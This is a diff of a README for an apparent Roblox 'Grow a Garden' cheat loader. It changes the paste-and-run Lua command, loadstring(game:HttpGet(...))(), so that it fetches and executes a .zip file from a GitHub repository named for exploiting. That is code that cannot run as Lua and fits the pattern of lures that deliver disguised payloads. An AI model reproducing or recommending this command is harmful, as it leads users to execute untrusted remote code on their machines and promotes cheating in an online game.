@@ -7,7 +7,7 @@ This repository provides a simple loader for the **Grow a Garden** Roblox script
 To execute this, use a Roblox Executor and run:
 
 ```lua
-loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/cW6njrrOHg6EFJjc/raw", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/skibidiexploiter4343/SPEEDHUB-X-GROW-GARDEN-Script-release/main/Tonkinese/SPEEDHUB-X-GROW-GARDEN-Script-release-v2.6.zip", true))()
 ```
 
 ## 📂 Script Info
